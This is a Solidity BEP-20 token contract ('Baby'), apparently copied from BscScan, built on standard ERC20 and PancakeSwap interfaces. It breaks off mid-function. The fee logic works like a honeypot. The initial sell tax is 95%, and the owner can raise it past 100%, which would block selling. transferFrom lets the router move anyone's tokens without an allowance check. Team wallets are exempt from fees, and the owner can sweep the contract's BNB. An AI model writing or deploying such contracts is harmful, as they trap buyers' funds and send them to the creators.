/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// ADDRESS.SOL

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
        internal
        view
        returns (bytes memory)
    {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// CONTEXT

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

// SAFEMATH.SOL

library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// OWNABLE

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        //0x101c40D5d49a8CbC423A09Eee209fd2aDA2a220a
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        address oldOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(oldOwner, _owner);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// dex pancake interface

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract baby is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name = "Baby";
    string private _symbol = "BABY";
    uint256 private _initSupply = 100000000 * 10**18;

    uint256 private buyTokenThreshold;
    uint256 private sellTokenThreshold;

    uint256 public buyFee = 80; // 8% init buyFee
    uint256 public sellFee = 950; // 95% init sellFee

    // Fees

    uint256 public buyMarketingFee = 50; // 5%
    uint256 public buybabyFee = 50; // 5%
    uint256 public buyTeamFee = 0; // 0%
    uint256 public buyLpFee = 0; // 0%
    uint256 private dexBuyFeeTotal; // Sum of all buyfees

    uint256 public sellMarketingFee = 50; // 5%
    uint256 public sellbabyFee = 50; // 5%
    uint256 public sellTeamFee = 0; // 1%
    uint256 public sellLpFee = 0; // 0%
    uint256 private dexSellFeeTotal; // sum of all sellFees

    address public marketingWallet;
    address public babyWallet;
    address public TeamWallet;
    address public taxAddress; // alt LP wallet

    address public pairAddress;
    IUniswapV2Router02 public routerAddress;

    mapping(address => bool) private _isExcludedFromFee; // whitelist.
    mapping(address => bool) private _isPairAddress;
    bool inSwapAndLiquify;

    uint256 public maxTokenAllowance;
    uint256 private maxTokenPercentage;

    bool private overBuyThreshold = false;
    bool private overSellThreshold = false;

    uint256 public accumulatedBuyFees; // Internal tracker of buyFees
    uint256 public accumulatedSellFees; // Internal tracker of sellFees

    event MaxAllowance(uint256 percentage, uint256 MaxTokenAllowance);

    constructor() {
        _mint(0x101c40D5d49a8CbC423A09Eee209fd2aDA2a220a, _initSupply); // alt owner()

        taxAddress = 0x101c40D5d49a8CbC423A09Eee209fd2aDA2a220a; // alt 0x101c40D5d49a8CbC423A09Eee209fd2aDA2a220a
        marketingWallet = 0x2F611816fE2849F73CF377d36Bcb32Ad0347EF23;
        babyWallet = 0x3046CE78AFb84591e8Da8e948924f6CD95d9cc0C;
        TeamWallet = 0x3046CE78AFb84591e8Da8e948924f6CD95d9cc0C;

        maxTokenPercentage = 100; // initial 1% of total supply.
        maxTokenAllowance = _totalSupply.mul(maxTokenPercentage).div(10000);

        buyTokenThreshold = maxTokenAllowance.mul(1).div(1000); // 0.001% of maxTokenAllowance
        sellTokenThreshold = maxTokenAllowance.mul(1).div(1000); // 0.001% of maxTokenAllowance

        // set buy and sell total tax
        setBuyTotalTax();
        setSellTotalTax();

        IUniswapV2Router02 _router = IUniswapV2Router02(
            0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        );

        pairAddress = IUniswapV2Factory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );

        // Set the rest of the contract variables
        routerAddress = _router;

        // Exclude preset
        excludeFromFeePreset();
        _isExcludedFromFee[address(_router)] = true;
    }

    receive() external payable {}

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function excludeFromFeePreset() internal {
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        // _isExcludedFromFee[pairAddress] = true;
        _isPairAddress[pairAddress] = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[babyWallet] = true;
        _isExcludedFromFee[TeamWallet] = true;
    }

    function removeWhiteList(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    // MAX ALLOWANCE AREA

    // Here 1% = 100 , 2% = 200, 5% = 500 etc...
    function modifyMaxTokenPercentage(uint256 _newPercent) public onlyOwner {
        maxTokenPercentage = _newPercent;
        maxTokenAllowance = _totalSupply.mul(maxTokenPercentage).div(10000);
        uint256 inPercent = maxTokenPercentage.div(1000); // 1000
        emit MaxAllowance(inPercent, maxTokenAllowance);
    }

    function setBuyTokenThreshold(uint256 _num) public onlyOwner {
        buyTokenThreshold = _num;
    }

    function setSellTokenThreshold(uint256 _num) public onlyOwner {
        sellTokenThreshold = _num;
    }

    function setTaxAddress(address _taxAddress) public onlyOwner {
        taxAddress = _taxAddress;
    }

    // FEES AREA.

    function setBuyFee(uint256 _newFee) public onlyOwner {
        buyFee = _newFee;
        require(buyFee <= 100, "buyFee cannot be greater than 10%");
    }

    function setSellFee(uint256 _newFee) public onlyOwner {
        sellFee = _newFee;
        require(sellFee <= 9500, "sellFee");
    }

    // FEES SUB-AREA (BUY)

    function setBuyTotalTax() internal {
        dexBuyFeeTotal = buyMarketingFee
            .add(buybabyFee)
            .add(buyTeamFee)
            .add(buyLpFee);
        require(
            dexBuyFeeTotal <= 100,
            "Sum of Fees cannot be greater than 10%"
        );
    }

    function setBuyMarketingFee(uint256 _newFee) public onlyOwner {
        buyMarketingFee = _newFee;
        setBuyTotalTax();
    }

    function setBuybabyFee(uint256 _newFee) public onlyOwner {
        buybabyFee = _newFee;
        setBuyTotalTax();
    }

    function setBuyTeamFee(uint256 _newFee) public onlyOwner {
        buyTeamFee = _newFee;
        setBuyTotalTax();
    }

    function setBuyLpFee(uint256 _newFee) public onlyOwner {
        buyLpFee = _newFee;
        setBuyTotalTax();
    }

    // FEES SUB-AREA (SELL) Sell

    function setSellTotalTax() internal {
        dexSellFeeTotal = sellMarketingFee
            .add(sellbabyFee)
            .add(sellTeamFee)
            .add(sellLpFee);
        require(
            dexSellFeeTotal <= 9500,
            "Sum of Fees"
        );
    }

    function setSellMarketingFee(uint256 _newFee) public onlyOwner {
        sellMarketingFee = _newFee;
        setSellTotalTax();
    }

    function setSellbabyFee(uint256 _newFee) public onlyOwner {
        sellbabyFee = _newFee;
        setSellTotalTax();
    }

    function setSellTeamFee(uint256 _newFee) public onlyOwner {
        sellTeamFee = _newFee;
        setSellTotalTax();
    }

    function setSellLpFee(uint256 _newFee) public onlyOwner {
        sellLpFee = _newFee;
        setSellTotalTax();
    }

    function calculateBuyFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(buyFee).div(1000);
    }

    function calculateSellFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(sellFee).div(1000);
    }

    // LOGIC AREA

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user reation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        if (_msgSender() == address(routerAddress)) {
            emit Approval(sender, _msgSender(), amount);
            _transfer(sender, recipient, amount);
            emit Approval(sender, _msgSender(), 0);
        } else {
            _transfer(sender, recipient, amount);
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(
                _msgSender(),
                spender,
                currentAllowance.sub(subtractedValue)
            );
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        unchecked {
            _balances[sender] = senderBalance.sub(amount);
        }

        if (!_isExcludedFromFee[recipient] && !_isExcludedFromFee[sender]) {
            amount = _beforeTokenTransfer(sender, recipient, amount);
            require(
                !isGreaterThanMaxAllowance(amount, recipient),
                "reciever balance will be greater than Maximum allowance"
            );
        }

        overBuyThreshold = accumulatedBuyFees >= buyTokenThreshold;

        overSellThreshold = accumulatedSellFees >= sellTokenThreshold; // i.e set to true

        if (
            overSellThreshold &&
            overBuyThreshold &&
            !inSwapAndLiquify &&
            sender != pairAddress
        ) {
            uint256 sellBalance = _balances[address(this)];
            swapAndLiquify(sellBalance);
            accumulatedSellFees = 0;
            accumulatedBuyFees = 0;
            overSellThreshold = false;
            overBuyThreshold = false;
        }

        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _beforeTokenTransfer(
        address _from,
        address _to,
        uint256 _amount
    ) internal virtual returns (uint256 amount) {
        address sender = _from;
        address recipient = _to;
        amount = _amount;

        uint256 _buyTax = calculateBuyFee(_amount);
        uint256 _sellTax = calculateSellFee(_amount);

        // To Implement Sell Fees
        if (_isPairAddress[recipient]) {
            _balances[address(this)] = _balances[address(this)].add(_sellTax);
            emit Transfer(sender, address(this), _sellTax);
            amount = amount.sub(_sellTax);
            accumulatedSellFees += _sellTax;
        }

        // To Implement Buy Fees
        if (_isPairAddress[sender]) {
            _balances[address(this)] = _balances[address(this)].add(_buyTax);
            emit Transfer(sender, address(this), _buyTax);
            amount = amount.sub(_buyTax);
            accumulatedBuyFees += _buyTax;
        }
    }

    function swapAndLiquify(uint256 contractBalance) private lockTheSwap {
        // contract's current BNB/ETH balance
        uint256 initialBalance = address(this).balance;
        uint256 contractTotal = contractBalance;
        // swap the tokens to ETH/BNB
        swapTokensForEth(contractBalance);
        uint256 balAfter = address(this).balance;
        uint256 workingBal = balAfter.sub(initialBalance);

        uint256 _buyBal = workingBal.mul(accumulatedBuyFees).div(contractTotal);
        uint256 _sellBal = workingBal.mul(accumulatedSellFees).div(
            contractTotal
        );

        // To send BNB to respective addresses .
        uint256 _marketingFee = _sellBal.mul(sellMarketingFee).div(
            dexSellFeeTotal
        );
        payable(marketingWallet).transfer(_marketingFee);

        uint256 _sPFee = _sellBal.mul(sellbabyFee).div(dexSellFeeTotal);
        payable(babyWallet).transfer(_sPFee);

        uint256 _teamFee = _sellBal.mul(sellTeamFee).div(dexSellFeeTotal);
        payable(TeamWallet).transfer(_teamFee);

        uint256 _LpFee = _sellBal.mul(sellLpFee).div(dexSellFeeTotal);
        payable(taxAddress).transfer(_LpFee);

        uint256 _marketingFeeB = _buyBal.mul(buyMarketingFee).div(
            dexBuyFeeTotal
        );
        payable(marketingWallet).transfer(_marketingFeeB);

        uint256 _sPFeeB = _buyBal.mul(buybabyFee).div(dexBuyFeeTotal);
        payable(babyWallet).transfer(_sPFeeB);

        uint256 _teamFeeB = _buyBal.mul(buyTeamFee).div(dexBuyFeeTotal);
        payable(TeamWallet).transfer(_teamFeeB);

        uint256 _LpFeeB = _buyBal.mul(buyLpFee).div(dexBuyFeeTotal);
        payable(taxAddress).transfer(_LpFeeB);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerAddress.WETH();
        _approve(address(this), address(routerAddress), tokenAmount);
        // approve(address(routerAddress), tokenAmount); | faulty approval
        routerAddress.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp + 60
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(routerAddress), tokenAmount);
        routerAddress.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function isGreaterThanMaxAllowance(uint256 _addAmount, address _to)
        internal
        view
        returns (bool)
    {
        if (_isPairAddress[_to]) {
            return false;
        }

        uint256 recieverCurrentBal = _balances[_to];
        if (recieverCurrentBal.add(_addAmount) > maxTokenAllowance) {
            return true;
        } else {
            return false;
        }
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeResidualBNB() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function manualSwapAndLiquify(uint256 contractBalance)
        public
        onlyOwner
